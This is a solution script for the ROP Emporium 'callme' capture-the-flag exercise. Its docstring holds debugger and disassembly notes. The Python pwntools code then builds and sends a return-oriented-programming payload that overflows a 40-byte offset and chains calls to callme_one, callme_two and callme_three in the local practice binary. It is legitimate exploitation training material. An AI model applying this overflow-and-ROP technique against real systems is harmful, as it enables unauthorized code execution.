#!/usr/bin/env python

"""


gdb-peda$ pattern_offset AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAe
AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAe found at offset: 40
root@w1:~/Desktop/challenges/ropemporium# rabin2 -R callme
[Relocations]
vaddr=0x00601ff8 paddr=0x00001ff8 type=SET_64 __gmon_start__
vaddr=0x00602080 paddr=0x00602080 type=SET_64
vaddr=0x00602090 paddr=0x00602090 type=SET_64
vaddr=0x006020a0 paddr=0x006020a0 type=SET_64
vaddr=0x00602018 paddr=0x00002018 type=SET_64 puts
vaddr=0x00602020 paddr=0x00002020 type=SET_64 printf
vaddr=0x00602028 paddr=0x00002028 type=SET_64 callme_three
vaddr=0x00602030 paddr=0x00002030 type=SET_64 memset
vaddr=0x00602038 paddr=0x00002038 type=SET_64 __libc_start_main
vaddr=0x00602040 paddr=0x00002040 type=SET_64 fgets
vaddr=0x00602048 paddr=0x00002048 type=SET_64 callme_one
vaddr=0x00602050 paddr=0x00002050 type=SET_64 setvbuf
vaddr=0x00602058 paddr=0x00002058 type=SET_64 callme_two
vaddr=0x00602060 paddr=0x00002060 type=SET_64 exit

14 relocations
root@w1:~/Desktop/challenges/ropemporium# rabin2 -i callme
[Imports]
Num  Vaddr       Bind      Type Name
   1 0x00000000    WEAK  NOTYPE _ITM_deregisterTMCloneTable
   2 0x004017f0  GLOBAL    FUNC puts
   3 0x00401800  GLOBAL    FUNC printf
   4 0x00401810  GLOBAL    FUNC callme_three
   5 0x00401820  GLOBAL    FUNC memset
   6 0x00401830  GLOBAL    FUNC __libc_start_main
   7 0x00401840  GLOBAL    FUNC fgets
   8 0x00401850  GLOBAL    FUNC callme_one
   9 0x00000000    WEAK  NOTYPE __gmon_start__
  10 0x00401860  GLOBAL    FUNC setvbuf
  11 0x00401870  GLOBAL    FUNC callme_two
  12 0x00000000    WEAK  NOTYPE _Jv_RegisterClasses
  13 0x00401880  GLOBAL    FUNC exit
  14 0x00000000    WEAK  NOTYPE _ITM_registerTMCloneTable
   1 0x00000000    WEAK  NOTYPE _ITM_deregisterTMCloneTable
   9 0x00000000    WEAK  NOTYPE __gmon_start__
  12 0x00000000    WEAK  NOTYPE _Jv_RegisterClasses
  14 0x00000000    WEAK  NOTYPE _ITM_registerTMCloneTable

root@w1:~/Desktop/challenges/ropemporium# objdump -M intel -D callme
0000000000401a05 <pwnme>:
  401a05:   55                      push   rbp
  401a06:   48 89 e5                mov    rbp,rsp
  401a09:   48 83 ec 20             sub    rsp,0x20
  401a0d:   48 8d 45 e0             lea    rax,[rbp-0x20]
  401a11:   ba 20 00 00 00          mov    edx,0x20
  401a16:   be 00 00 00 00          mov    esi,0x0
  401a1b:   48 89 c7                mov    rdi,rax
  401a1e:   e8 fd fd ff ff          call   401820 <memset@plt>
  401a23:   bf 70 1b 40 00          mov    edi,0x401b70
  401a28:   e8 c3 fd ff ff          call   4017f0 <puts@plt>
  401a2d:   bf 92 1b 40 00          mov    edi,0x401b92
  401a32:   b8 00 00 00 00          mov    eax,0x0
  401a37:   e8 c4 fd ff ff          call   401800 <printf@plt>
  401a3c:   48 8b 15 4d 06 20 00    mov    rdx,QWORD PTR [rip+0x20064d]        # 602090 <stdin@@GLIBC_2.2.5>
  401a43:   48 8d 45 e0             lea    rax,[rbp-0x20]
  401a47:   be 00 01 00 00          mov    esi,0x100
  401a4c:   48 89 c7                mov    rdi,rax
  401a4f:   e8 ec fd ff ff          call   401840 <fgets@plt>
  401a54:   90                      nop
  401a55:   c9                      leave  
  401a56:   c3                      ret    

0000000000401a57 <usefulFunction>:
  401a57:   55                      push   rbp
  401a58:   48 89 e5                mov    rbp,rsp
  401a5b:   ba 06 00 00 00          mov    edx,0x6
  401a60:   be 05 00 00 00          mov    esi,0x5
  401a65:   bf 04 00 00 00          mov    edi,0x4
  401a6a:   e8 a1 fd ff ff          call   401810 <callme_three@plt>
  401a6f:   ba 06 00 00 00          mov    edx,0x6
  401a74:   be 05 00 00 00          mov    esi,0x5
  401a79:   bf 04 00 00 00          mov    edi,0x4
  401a7e:   e8 ed fd ff ff          call   401870 <callme_two@plt>
  401a83:   ba 06 00 00 00          mov    edx,0x6
  401a88:   be 05 00 00 00          mov    esi,0x5
  401a8d:   bf 04 00 00 00          mov    edi,0x4
  401a92:   e8 b9 fd ff ff          call   401850 <callme_one@plt>
  401a97:   bf 01 00 00 00          mov    edi,0x1
  401a9c:   e8 df fd ff ff          call   401880 <exit@plt>
  401aa1:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  401aa8:   00 00 00 
  401aab:   0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401ab0 <usefulGadgets>:
  401ab0:   5f                      pop    rdi
  401ab1:   5e                      pop    rsi
  401ab2:   5a                      pop    rdx
  401ab3:   c3                      ret    
  401ab4:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  401abb:   00 00 00 
  401abe:   66 90                   xchg   ax,ax




  401ab0:   5f                      pop    rdi
  401ab1:   5e                      pop    rsi
  401ab2:   5a                      pop    rdx



0x0000000000401a6a <+19>:    call   0x401810 <callme_three@plt>
0x0000000000401a7e <+39>:    call   0x401870 <callme_two@plt>
0x0000000000401a92 <+59>:    call   0x401850 <callme_one@plt>

"""

from pwn import *

payload = "\x90"*40 + p64(0x401ab0) + p64(1) + p64(2) + p64(3) + p64(0x401850) + p64(0x401ab0) + p64(1) + p64(2) + p64(3) + p64(0x401870) + p64(0x401ab0) + p64(1) + p64(2) + p64(3) + p64(0x401810)

p = process('./callme')
# p = gdb.debug('./callme', 'b *0x0000000000401850')

print p.recvuntil('>')
p.sendline(payload)
print p.recvuntil('}')
# print p.recvline()